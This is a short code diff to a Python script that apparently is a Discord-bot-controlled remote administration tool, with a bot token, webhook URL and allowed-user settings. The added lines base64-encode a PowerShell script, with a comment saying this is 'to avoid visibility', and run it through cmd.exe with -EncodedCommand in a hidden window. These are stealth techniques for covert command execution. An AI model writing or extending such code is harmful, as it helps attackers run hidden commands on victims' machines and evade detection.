@@ -22,9 +22,9 @@ import urllib
 import win32com
 import psutil 
 
-TOKEN = ''
-WEBHOOK_URL = ''
-ALLOWED_USER_ID = ''
+TOKEN = 'TOKEN_BOT'
+WEBHOOK_URL = 'URL'
+ALLOWED_USER_ID = 'UUID'
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -64,9 +64,19 @@ async def on_ready():
     '''
 
     try:
+        # Encode the PowerShell script to base64 to avoid visibility
+        encoded_script = base64.b64encode(ps_script.encode('utf-16-le')).decode('utf-8')
+        
+        # Execute via hidden CMD window
+        startupinfo = subprocess.STARTUPINFO()
+        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        startupinfo.wShowWindow = subprocess.SW_HIDE
+        
         output = subprocess.check_output(
-            ['powershell', '-NoProfile', '-Command', ps_script],
-            stderr=subprocess.STDOUT,
+            ['cmd.exe', '/c', 'powershell.exe', '-EncodedCommand', encoded_script],
+            startupinfo=startupinfo,
+            stderr=subprocess.PIPE,
+            stdin=subprocess.PIPE,
             timeout=10,
             shell=False
         )
